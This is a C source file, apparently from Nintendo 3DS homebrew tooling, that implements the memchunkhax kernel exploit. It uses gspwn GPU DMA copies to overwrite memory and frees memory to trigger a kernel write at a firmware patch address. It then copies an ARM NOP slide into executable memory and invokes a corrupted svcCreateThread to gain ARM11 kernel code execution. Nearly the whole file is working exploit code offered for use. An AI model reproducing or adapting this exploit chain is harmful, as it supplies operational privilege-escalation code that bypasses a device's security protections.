#include "memchunkhax.h"

#include <stddef.h>
#include <stdint.h>
#include "firmcompat.h"
#include "../mset/draw.h"

// MSET functions
void (*memcpy)(char *dest, char *src, int len) = (void *)0x001BFA60;
uint32_t (*GSPGPU_FlushDataCache)(void *address, uint32_t length) = (void *)0x0013C5D4;
void (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(void *arg1, void *arg2) = (void *)0x001AC924;
uint32_t (*svcControlMemory)(uint32_t* outaddr, uint32_t *addr0, uint32_t *addr1, uint32_t size, uint32_t operation, uint32_t permissions) = (void *)0x001C3E24;


void gspwn_copy(void *dest, void *src, uint32_t length, int check, int check_offset)
{
    // I have no idea what this is
    void *gpuhandle = (void *)0x0027C5D8;

    // We'll use some memory to check the copy is being done right.
    void *check_mem = (void *)0x14001000;
    int *check_loc = (int *)(check_mem + check_offset);

    print("Doing gspwn copy");
    while(*check_loc != check) {
        print("Entering loop");

        memcpy(check_mem, check_mem, 0x10000);
        print("Done memcpy");

        GSPGPU_FlushDataCache(src, length);
        print("Flushed data cache");

        uint32_t arr1[] = {4, (uint32_t)src, (uint32_t)dest, length,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(gpuhandle, arr1);
        print("Executed the weird thing");

        GSPGPU_FlushDataCache(check_mem, 0x10);
        print("Flushed data cache 2");

        uint32_t arr2[] = {4, (uint32_t)dest, (uint32_t)check_mem, 0x10,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(gpuhandle, arr2);
        print("Executed the weird thing 2");

        memcpy(check_mem, check_mem, 0x10000);
        print("Done memcpy 2");
    }
}

void build_nop_slide(uint32_t *dest, unsigned int len)
{
    unsigned int i;
    for (i = 0; i < len; i++) {
        dest[i] = 0xE1A00000;  // ARM instruction: nop
    }
    dest[i - 1] = 0xE12FFF1E;  // ARM instruction: bx lr
}

__attribute__((naked))
void corrupted_svcCreateThread(__attribute__((unused)) void (*func)())
{
    __asm__ volatile ("svc 8");
}

void memchunk_arm11hax(void (*func)())
{
    // I need some memory locations to use
    uint32_t *mem_hax_mem = (uint32_t *)0x14050000;
    uint32_t *mem_hax_mem_free = (uint32_t *)((uint32_t)mem_hax_mem + 0x1000);

    // I can allocate them myself, but since I'm not running in ninjhax, I don't care.
    /*uint32_t mem_hax_mem;
    svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, 0x10003, 3);
    uint32_t mem_hax_mem_free = mem_hax_mem + 0x1000;*/
    // I refrain from allocating memory anywhere,
    // since I'm in control of it for a while, anyway.
    // Unless I can use the stack more easily/readably, static offsets it is.

    // All the documentation the rest of the code has is the prints.
    // I've never studied the logic of it, so I can't describe it in more detail.

    uint32_t tmp_addr;
    svcControlMemory(&tmp_addr, mem_hax_mem_free, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
    print("Freed memory");

    // arm11_buffer is the location that is copied *from* when using gspwn_copy
    uint32_t *arm11_buffer = (uint32_t *)0x14002000;
    arm11_buffer[0] = 1;
    arm11_buffer[1] = fw->kernel_patch_address;
    arm11_buffer[2] = 0;
    arm11_buffer[3] = 0;

    gspwn_copy(mem_hax_mem_free, arm11_buffer, 0x10, fw->kernel_patch_address, 4);
    print("Did gspwn copy");

    svcControlMemory(&tmp_addr, mem_hax_mem, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
    print("Triggered kernel write");

    build_nop_slide(arm11_buffer, 0x4000);
    print("Built nop slide");

    uint32_t gsp_addr = 0x14000000;
    uint32_t fcram_code_addr = 0x03E6D000;
    gspwn_copy((void *)(gsp_addr + fcram_code_addr + 0x4000), arm11_buffer,
               0x10000, 0xE1A00000, 0);
    print("Copied nop slide");

    ((void (*)())0x104000)();
    print("Executed nop slide");

    print("Entering arm11");
    corrupted_svcCreateThread(func);
    print("Huh? I'm back?");
}
